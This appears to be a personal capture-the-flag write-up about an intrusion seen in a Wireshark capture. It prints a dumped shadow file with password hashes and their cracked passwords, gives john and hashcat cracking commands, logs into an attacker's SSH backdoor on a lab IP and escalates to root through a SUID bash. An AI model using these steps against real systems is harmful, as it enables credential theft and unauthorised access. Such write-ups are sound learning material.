Read wireshark. In the end of the file we can see an ssh connection. The initial attack was a file upload vulnerability -> Reverse shell

james:password(read the early wireshark logs to findout the password)

The attacker established an ssh [backdoor](https://github.com/NinjaJc01/ssh-backdoor). 



```
)ºH)nEê®½@@¯ÎÀ¨ªÀ¨ªáP	aµdg§Õ1öÜ^
5QÂýøroot:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
```

Clean up the shadow file(This is 114 in wireshark)
```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::

```
john --wordlist=fasttrack.txt cleanup
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
secuirty3        (paradox)
4g 0:00:00:00 DONE (2022-07
The four passwords are revealed

3479 is the hashes flag/key

./backdoor -a HASH


After analyzing the source code(Backdoor) we realize the hash is a sha512(hint: with a salt that may or may not be in the golang file)
https://hashcat.net/forum/thread-1541.html

hashcat -m 1710 clean2 rockyou.txt

The password is hashvalue:password
^ Output


ssh -p 2222 10.10.6.32

Using the above password. Something I was not aware of, just because it's ssh doesn't mean it needs a password.

Enumerating/linpeas relveased a file called ".suid_bash"

If you look for suid bits(The attacker does this in Wireshark/this may be a hint)

find / -perm -u=s -type f 2>/dev/null
or wget linpeas.sh
Turns out the file is executable. I did not realize this & glanced at a walkthrough before using a polkit exploit. I still have to look into the -p & why that activated root. Once you're root read the flag.

```
/home/james/.suid_bash

cd to /home/james/

ls -la

./.suid_bash -p
```

This was a super fun CTF!
